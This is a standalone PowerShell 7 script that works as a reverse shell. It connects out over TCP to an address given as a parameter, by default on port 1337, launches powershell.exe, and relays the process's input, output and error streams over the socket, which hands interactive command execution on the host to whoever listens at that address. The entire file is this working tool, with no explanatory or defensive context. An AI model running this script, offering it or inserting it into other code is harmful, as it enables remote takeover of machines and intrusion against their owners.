# Compatible with Powershell 7+

param (
    [Parameter(Position = 0, Mandatory = $true)]
    [String]$address,

    [Parameter(Position = 1, Mandatory = $false)]
    [String]$port = 1337,

    [Parameter(Position = 2, Mandatory = $false)]
    [String]$filename = 'powershell.exe',

    [Parameter(Position = 3, Mandatory = $false)]
    [String]$arguments = ''
)


try
{
    $socket = New-Object System.Net.Sockets.TcpClient($address, $port)
}
catch
{
    Write-Error "Failed to establish connection to server: $_"
    exit 1
}

try
{
    $socket_stream = $socket.GetStream()
}
catch
{
    $socket.Dispose()
    Write-Error "Failed to get stream from socket: $_"
    exit 1
}

try
{
    $process_start_info = New-Object System.Diagnostics.ProcessStartInfo($filename, $arguments)
    $process_start_info.UseShellExecute = $false
    $process_start_info.CreateNoWindow = $false
    $process_start_info.RedirectStandardInput = $true
    $process_start_info.RedirectStandardOutput = $true
    $process_start_info.RedirectStandardError = $true

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $process_start_info

    [void]$process.Start()
}
catch
{
    $socket.Dispose()
    Write-Error "Failed to start process: $_"
    exit 1
}


$input_redirector = {
    param (
        [System.IO.Stream]$from_socket,
        [System.IO.Stream]$to_stdin
    )

    $buffer = New-Object Byte[] 1024

    while ($true)
    {
        try
        {
            $bytes_read = $from_socket.Read($buffer, 0, $buffer.Length)

            if ($bytes_read -eq 0)
            {
                $to_stdin.Flush()
                break # stream has been closed, connection was probably terminated
            }

            $to_stdin.Write($buffer, 0, $bytes_read)
            [Array]::Clear($buffer, 0, $bytes_read)

            if (-not $from_socket.DataAvailable)
            {
                $to_stdin.Flush()
            }
        }
        catch
        {
            Write-Error "Something went wrong during socket output -> process input piping: $_"
            break
        }
    }
}

$output_redirector = {
    param (
        [System.IO.Stream]$from_stdout, # or stderr
        [System.IO.Stream]$to_socket,
        [String]$mutex_name
    )

    $locked = $false
    $lock = New-Object System.Threading.Mutex($false, $mutex_name)
    $buffer = New-Object Byte[] 1024

    while ($true)
    {
        try
        {
            $bytes_read = $from_stdout.Read($buffer, 0, $buffer.Length)

            if ($bytes_read -eq 0)
            {
                if ($locked)
                {
                    $to_socket.Flush()
                    $lock.ReleaseMutex()
                    $locked = $false
                }

                break # stream has been closed, process probably exited
            }

            if (-not $locked)
            {
                [void]$lock.WaitOne()
                $locked = $true
            }

            $to_socket.Write($buffer, 0, $bytes_read)
            [Array]::Clear($buffer, 0, $bytes_read)

            if (-not $from_stdout.DataAvailable -and $locked)
            {
                $to_socket.Flush()
                $lock.ReleaseMutex()
                $locked = $false
            }
        }
        catch
        {
            Write-Error "Something wen't wrong during process output -> socket input piping: $_"
            break
        }
    }
}


$socket_mutex_name = [Guid]::NewGuid().ToString()

$jobs = @(
    # handler for socket -> stdin
    (Start-ThreadJob -ScriptBlock $input_redirector -ArgumentList $socket_stream, $process.StandardInput.BaseStream),
    # handler for stdout -> socket
    (Start-ThreadJob -ScriptBlock $output_redirector -ArgumentList $process.StandardOutput.BaseStream, $socket_stream, $socket_mutex_name),
    # handler for stderr -> socket
    (Start-ThreadJob -ScriptBlock $output_redirector -ArgumentList $process.StandardError.BaseStream, $socket_stream, $socket_mutex_name)
)


while ($true)
{
    $job_states = $jobs | ForEach-Object { Get-Job -Id $_.Id }
    $jobs_completed = $job_states | Where-Object { $_.State -eq 'Completed' }
    $jobs_failed = $job_states | Where-Object { $_.State -eq 'Failed' }

    if ($jobs_completed -or $jobs_failed)
    {
        $jobs_failed | ForEach-Object {
            Receive-Job -Job $_ -ErrorAction SilentlyContinue
        }

        break
    }

    Start-Sleep -Milliseconds 250
}


$jobs | ForEach-Object {
    Stop-Job -Job $_
    Remove-Job -Job $_ -Force
}

$process.Dispose()
$socket.Dispose()